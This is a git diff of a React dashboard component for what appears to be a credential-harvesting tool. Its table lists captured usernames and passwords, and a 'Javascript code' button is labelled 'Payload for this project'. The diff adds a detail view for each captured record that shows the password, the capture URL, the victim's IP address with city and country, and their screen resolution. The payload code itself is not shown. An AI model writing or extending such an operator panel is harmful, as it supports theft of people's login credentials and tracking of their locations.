@@ -24,6 +24,9 @@ import SettingsIcon from 'material-ui-icons/Settings';
 import Paper from 'material-ui/Paper';
 import { LinearProgress } from 'material-ui/Progress';
 import AddIcon from 'material-ui-icons/Add';
+import CloseIcon from 'material-ui-icons/Close';
+import Slide from 'material-ui/transitions/Slide';
+import ReactJson from 'react-json-view'
 import Dialog, {
 	DialogActions,
 	DialogContent,
@@ -33,6 +36,10 @@ import Dialog, {
 import Table, { TableBody, TableCell, TableHead, TableRow } from 'material-ui/Table';
 
 let drawerWidth = 240
+
+function Transition(props) {
+  return <Slide direction="up" {...props} />;
+}
 
 const styles = theme => ({
   root: {
@@ -46,6 +53,9 @@ const styles = theme => ({
     display: 'flex',
     width: '100%',
     height: '100%',
+  },
+  flex: {
+    flex: 1,
   },
   appBar: {
     position: 'absolute',
@@ -86,6 +96,9 @@ const styles = theme => ({
   menuButton: {
     marginLeft: 12,
     marginRight: 20,
+  },
+  recordContent: {
+    paddingTop: 75,
   },
   hide: {
     display: 'none',
@@ -134,6 +147,7 @@ const styles = theme => ({
 class PersistentDrawer extends Component {
   state = {
     open: false,
+    recordOpen: false,
     currentProject: null,
     loading: false,
   };
@@ -160,6 +174,17 @@ class PersistentDrawer extends Component {
     this.setState({ open: false })
   }
 
+  handleRecordOpen = (record) => {
+    this.setState({
+      recordOpen: true,
+      record: record
+    })
+  };
+
+  handleRecordClose = () => {
+    this.setState({ recordOpen: false });
+  };
+
   returnHome = () => {
     this.setState({ currentProject: null })
     this.props.emit("project:close")
@@ -182,7 +207,7 @@ class PersistentDrawer extends Component {
 
 	viewJSON = () => {
 		window.open("/api/" + encodeURIComponent(this.props.token) + "/" + encodeURIComponent(this.state.currentProject.name) /*+ "&download=true"*/)
-	}
+  }
 
   render() {
     const { classes, theme, signIn } = this.props;
@@ -267,29 +292,86 @@ class PersistentDrawer extends Component {
                               <TableCell numeric>{record.username}</TableCell>
                               <TableCell numeric>{record.password}</TableCell>
                               <TableCell numeric>
-                                <Button color="primary" dense>
+                                <Button color="primary" dense onClick={() => {this.handleRecordOpen(record)}}>
                                   More
                                 </Button>
                               </TableCell>
                             </TableRow>
-                          );
+                          )
                         })}
                         <tr ref={el => this.tableEnd = el} className="tableEnd"></tr>
                       </TableBody>
                     </Table>
                   </Paper>
                   <br />
-                  <Tooltip title="Payload for this project" placement="left">
+                  <Tooltip title="Payload for this project" placement="bottom">
                     <Button onClick={this.viewJS} color="primary">
                       Javascript code
                     </Button>
                   </Tooltip>
-                  <Button onClick={this.viewJSON} color="primary" autoFocus>
-                    View JSON
-                  </Button>
-                  <Button fab color="primary" aria-label="add" className={classes.newProject} onClick={this.props.newProject}>
-                    <AddIcon />
-                  </Button>
+                  <Tooltip title="Show the raw JSON database entries" placement="bottom">
+                    <Button onClick={this.viewJSON} color="primary">
+                      View JSON
+                    </Button>
+                  </Tooltip>
+                  <Tooltip title="New project" placement="left">
+                    <Button fab color="primary" aria-label="add" className={classes.newProject} onClick={this.props.newProject}>
+                      <AddIcon />
+                    </Button>
+                  </Tooltip>
+                  {this.state.recordOpen ? (
+                    <Dialog
+                      fullScreen
+                      open={this.state.recordOpen}
+                      onRequestClose={this.handleRecordClose}
+                      transition={Transition}
+                    >
+                      <AppBar>
+                        <Toolbar>
+                          <IconButton color="contrast" onClick={this.handleRecordClose} aria-label="Close">
+                            <CloseIcon />
+                          </IconButton>
+                          <Typography type="title" color="inherit" className={classes.flex}>
+                            Record for {this.state.currentProject.name}
+                          </Typography>
+                          {/* <Button color="contrast" onClick={this.handleRecordClose}>
+                            save
+                          </Button> */}
+                        </Toolbar>
+                      </AppBar>
+                      <List className={classes.recordContent}>
+                        <ListItem>
+                          <ListItemText primary="Timestamp" secondary={this.state.record.timestamp} />
+                        </ListItem>
+                        <Divider />
+                        <ListItem>
+                          <ListItemText primary="Username" secondary={this.state.record.username} />
+                        </ListItem>
+                        <Divider />
+                        <ListItem>
+                          <ListItemText primary="Password" secondary={this.state.record.password} />
+                        </ListItem>
+                        <Divider />
+                        <ListItem>
+                          <ListItemText primary="Capture URL" secondary={this.state.record.url} />
+                        </ListItem>
+                        <Divider />
+                        <ListItem>
+                          <ListItemText primary="IP Address" secondary={`${this.state.record.ip.query}${this.state.record.ip.country ? " (" + this.state.record.ip.city + " - " + this.state.record.ip.country + ")" : ""}`} />
+                        </ListItem>
+                        <Divider />
+                        <ListItem>
+                          <ListItemText primary="Screen resolution" secondary={`${this.state.record.browser.width}x${this.state.record.browser.height}px`} />
+                        </ListItem>
+                        <Divider />
+                        <br />
+                        <ListItem>
+                          <ReactJson src={this.state.record} />
+                        </ListItem>
+                      </List>
+                    </Dialog>
+                    ) : null
+                  }
                 </main>
               ) : (
                 <main
@@ -298,9 +380,11 @@ class PersistentDrawer extends Component {
                   })}
                 >
                   {this.props.children}
-                  <Button fab color="primary" aria-label="add" className={classes.newProject} onClick={this.props.newProject}>
-                    <AddIcon />
-                  </Button>
+                  <Tooltip title="New project" placement="left">
+                    <Button fab color="primary" aria-label="add" className={classes.newProject} onClick={this.props.newProject}>
+                      <AddIcon />
+                    </Button>
+                  </Tooltip>
                 </main>
             )
           }
